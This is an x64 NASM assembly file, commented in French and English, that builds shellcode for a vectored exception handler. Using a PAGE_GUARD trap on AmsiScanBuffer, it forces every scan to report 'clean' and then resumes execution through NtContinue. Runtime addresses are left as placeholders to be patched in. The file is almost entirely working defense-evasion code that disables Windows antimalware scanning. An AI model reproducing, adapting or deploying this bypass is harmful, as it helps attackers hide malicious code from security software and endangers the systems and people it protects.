[BITS 64]
; nasm -f bin CustomHandler.asm -o CustomHandler.bin ; xxd -i CustomHandler.bin

; void CustomHandler(PEXCEPTION_RECORD ExceptionRecord, PCONTEXT ContextRecord)
; RCX = ExceptionRecord, RDX = ContextRecord

    ; 1. Filtrage par Thread-ID (Synchronisation)
    mov r12, gs:[0x48]          ; TEB -> ClientId.UniqueThread
    lea r13, [rel target_tid]
    mov r13, [r13]
    cmp r12, r13
    jne pass_exception

    ; 2. Vérification du code d'exception (PAGE_GUARD)
    mov eax, dword [rcx]        ; ExceptionRecord->ExceptionCode
    cmp eax, 0x80000001         ; STATUS_GUARD_PAGE_VIOLATION
    jne pass_exception

    ; 3. Vérification de la cible (RIP == AmsiScanBuffer)
    mov r8, [rdx + 0xF8]        ; ContextRecord->Rip
    lea r9, [rel amsi_addr]
    mov r9, [r9]
    cmp r8, r9
    jne pass_exception

    ; 4. Émulation du RET et patch de AMSI_RESULT
    mov r11, [rdx + 0x98]       ; r11 = ContextRecord->Rsp (stack pointer at function entry)

    ; Retrieve the 6th argument (AMSI_RESULT pointer) from the stack
    mov r10, [r11 + 0x30]       ; r10 = pointer to AMSI_RESULT
    
    ; Safety Check: Ensure the pointer is not NULL before writing
    test r10, r10
    jz skip_result_write
    mov dword [r10], 0          ; Set AMSI_RESULT to AMSI_RESULT_CLEAN (0)
    
skip_result_write:
    ; Set ret value of AmsiScanBuffer to S_OK (0) 
    mov qword [rdx + 0x78], 0   ; ContextRecord->Rax = S_OK (0)

    ; Emulate the "ret" of AmsiScanBuffer to avoid crashing the process 
    mov r10, [r11]              ; r10 = ctx.[rsp] (ret addr of AmsiScanBuffer)
    mov [rdx + 0xF8], r10       ; ContextRecord->Rip = ret addr
    add qword [rdx + 0x98], 8   ; ContextRecord->Rsp += 8 (simulate pop stack)

    ;==== ABI Compliant OutputDebugStringA Call (debug) ====
    push rdx                     ; /!\ SAUVEGARDE CRITIQUE DE RDX (ContextRecord) /!\
    
    push rbp
    mov rbp, rsp
    and rsp, -16                 ; Alignement sur 16 bytes (0xFFFFFFFFFFFFFFF0)
    sub rsp, 32                  ; Allocation du Shadow Space (0x20)

    mov rax, 0x1337133713371337
    lea rcx, [rel debug_string]
    call rax                     ; OutputDebugStringA (écrase rdx)

    ; Restauration de la stack
    mov rsp, rbp
    pop rbp
    
    pop rdx                      ; /!\ RESTAURATION DE RDX /!\
    ;============================================================

    ; 5. Terminaison silencieuse via NtContinue
    mov rcx, rdx                ; rcx = ContextRecord modifié
    xor rdx, rdx                ; rdx = FALSE (TestAlert)
    lea rax, [rel nt_continue]
    mov rax, [rax]
    jmp rax                     ; Transfert de flux vers NtContinue

pass_exception:
    ret                         ; Retourne au KiUserExceptionDispatcher normal

; Variables dynamiques (Alignement sur 16-octets pour le CFG bitmap)
align 16
target_tid:
    dq 0x1111111111111111
amsi_addr:
    dq 0x2222222222222222
nt_continue:
    dq 0x3333333333333333   

debug_string:
    db "Patched ", 0